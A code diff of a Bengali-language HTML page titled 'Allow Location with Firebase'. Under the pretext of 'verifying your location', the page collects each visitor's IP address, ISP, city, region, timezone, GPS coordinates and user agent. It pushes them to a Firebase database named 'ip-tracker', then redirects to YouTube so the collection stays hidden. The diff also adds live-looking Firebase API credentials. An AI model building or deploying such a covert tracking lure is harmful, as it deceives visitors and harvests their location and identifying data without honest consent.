@@ -1,33 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
   <meta charset="UTF-8" />
-  <title>Allow Location</title>
+  <title>Allow Location with Firebase</title>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
-    button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+      background: #2196f3;
+      color: white;
+      cursor: pointer;
+    }
   </style>
-  <!-- Firebase SDKs -->
-  <script type="module">
-    // Import Firebase modules
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
-    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-firestore.js";
+  <!-- Firebase CDN -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+</head>
+<body>
+  <h2>📍 অনুগ্রহ করে লোকেশন অ্যাক্সেস দিন</h2>
+  <p>এটি আমাদের আপনার অবস্থান যাচাই করতে সাহায্য করবে।</p>
+  <button onclick="startTracking()">Allow & Continue</button>
 
-    // Your Firebase config - এখানের তথ্য তোমার প্রজেক্ট থেকে নিয়ে আসবে
+  <script>
+    // তোমার Firebase config বসাও এখানে:
     const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_AUTH_DOMAIN",
-      projectId: "YOUR_PROJECT_ID",
-      storageBucket: "YOUR_STORAGE_BUCKET",
-      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-      appId: "YOUR_APP_ID"
+      apiKey: "AIzaSyD7-mS804xPfoS8pJnboMpsbZGFrHEIcVk",
+      authDomain: "ip-tracker-d63e1.firebaseapp.com",
+      projectId: "ip-tracker-d63e1",
+      storageBucket: "ip-tracker-d63e1.firebasestorage.app",
+      messagingSenderId: "978015386276",
+      appId: "1:978015386276:web:418573d8546b922b974431",
+      measurementId: "G-SZB4ZMG0V3"
     };
 
-    // Initialize Firebase app and Firestore
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    // Function to get geolocation
     async function getGeoCoords() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -49,37 +61,47 @@
       });
     }
 
-    // Function to send data to Firestore
     async function startTracking() {
       try {
+        // Get IP
+        const ipRes = await fetch('https://api64.ipify.org?format=json');
+        const ipJson = await ipRes.json();
+        const ip = ipJson.ip;
+
+        // Location via IP
+        const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
+        const locData = await locRes.json();
+
+        // GPS Location
         const gps = await getGeoCoords();
 
-        // Prepare data object
+        // Prepare data
         const data = {
+          ip: ip,
+          isp: locData.org || 'N/A',
+          country: locData.country || 'N/A',
+          city: locData.city || 'N/A',
+          region: locData.region || 'N/A',
+          timezone: locData.timezone || 'N/A',
           latitude: gps.latitude,
           longitude: gps.longitude,
           user_agent: navigator.userAgent,
-          timestamp: serverTimestamp()
+          timestamp: new Date().toISOString()
         };
 
-        // Save to Firestore collection "locations"
-        await addDoc(collection(db, "locations"), data);
+        // Send data to Firebase Realtime Database
+        await db.ref('visitors').push(data);
+
+        alert("তোমার তথ্য সফলভাবে পাঠানো হয়েছে।");
 
       } catch (err) {
-        console.error("Error saving location:", err);
+        console.error("Tracking error:", err);
+        alert("ত্রুটি ঘটেছে, পরে আবার চেষ্টা করো।");
       } finally {
-        // Redirect to YouTube after
+        // Optional redirect - তুমি চাইলে রাখো বা সরিয়ে দাও
         window.location.href = "https://youtube.com";
       }
     }
-
-    // Attach to window so can call from inline button onclick
-    window.startTracking = startTracking;
   </script>
-</head>
-<body>
-  <h2>📍 Please allow location access</h2>
-  <p>This helps us verify your location.</p>
-  <button onclick="startTracking()">Allow & Continue</button>
 </body>
 </html>
